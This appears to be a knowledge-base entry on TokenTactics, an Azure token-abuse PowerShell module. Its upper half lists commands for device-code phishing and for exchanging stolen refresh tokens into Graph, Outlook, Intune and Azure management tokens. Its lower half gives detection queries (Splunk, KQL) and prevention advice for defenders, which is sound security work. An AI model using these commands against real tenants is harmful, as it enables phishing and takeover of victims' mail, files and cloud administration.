name: TokenTactics - Azure Token Manipulation
description: TokenTactics is a PowerShell module for abusing Azure JWT access and refresh tokens. After a device-code or stolen refresh token, it swaps a refresh token for access tokens to many first-party resources (MSGraph, AADGraph, Outlook, Substrate, DeviceManagement, etc.), enabling lateral movement across M365 services without re-prompting the user.
notes:
=== INSTALL ===
  Import-Module .\TokenTactics.psd1

=== DEVICE-CODE PHISH (get first tokens) ===
  Get-AzureToken -Client MSGraph
  # prints a microsoft.com/devicelogin code; victim enters it -> you receive tokens

=== REFRESH -> NEW RESOURCE TOKENS ===
  # once you hold $response.refresh_token, pivot to other audiences:
  RefreshTo-MSGraphToken   -domain <domain> -refreshToken $rt
  RefreshTo-OutlookToken   -domain <domain> -refreshToken $rt
  RefreshTo-AzureCoreManagementToken -domain <domain> -refreshToken $rt
  RefreshTo-DeviceManagementToken   -domain <domain> -refreshToken $rt   # Intune
  RefreshTo-SubstrateToken -domain <domain> -refreshToken $rt

=== USE THE TOKEN ===
  # feed $token.access_token to MSGraph calls, roadrecon, or AADInternals -AccessToken

=== DECODE / INSPECT ===
  Parse-JWTtoken -token $token.access_token    # aud, scp, roles, upn

=== ALTERNATIVES ===
  AADInternals   # broader toolkit incl. token acquisition
  GraphRunner    # Graph-centric post-ex
  roadtx (ROADtools) # token flows incl. PRT

recommended.note: AADInternals consumes the same tokens for broader attacks.
GraphRunner for Graph post-exploitation with the token.
Underlying Entra auth flows abused here.

defense.why_it_works: OAuth refresh tokens are long-lived bearer artifacts. A refresh token for one first-party client can be redeemed for access tokens to other first-party resources (family-of-client-ids), so a single phished token grants wide reach without MFA re-prompts.
defense.prerequisites: A valid refresh token (from device-code phishing, token theft, or a stolen PRT). No password needed once the refresh token is held.
defense.impact: Cross-service access (mail, files, Intune, Azure management) as the victim, persistent until the refresh token is revoked or Conditional Access re-evaluates.
defense.detection: [MITRE T1550.001] Entra sign-in logs showing token redemptions across many first-party app IDs from one refresh token / IP in a short window; device-code authentications; impossible-travel between original sign-in and token-use IP.
defense.artifacts: Entra sign-in logs (appDisplayName variety, authenticationProtocol=deviceCode), token issuance bursts, unfamiliar client/IP combinations.
defense.splunk_spl:
index=azure sourcetype=azure:aad:signin
| stats dc(appDisplayName) as apps values(appDisplayName) as app_list by userPrincipalName, ipAddress, bin(_time,1h)
| where apps > 4
defense.sentinel_kql:
SigninLogs
| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName) by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)
| where Apps > 4
defense.prevention: Conditional Access with device compliance and sign-in risk policies; block/limit device-code flow; shorten token lifetimes and enable continuous access evaluation (CAE); revoke refresh tokens on risk; phishing-resistant MFA (FIDO2).

detections.name: Single identity redeeming tokens for many first-party apps
detections.logic:
SigninLogs
| where ResultType == 0
| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName), IPs=make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)
| where Apps > 4
detections.false_positives: Power users with many integrated apps
detections.tuning: Baseline per-user app breadth; weight by new IP
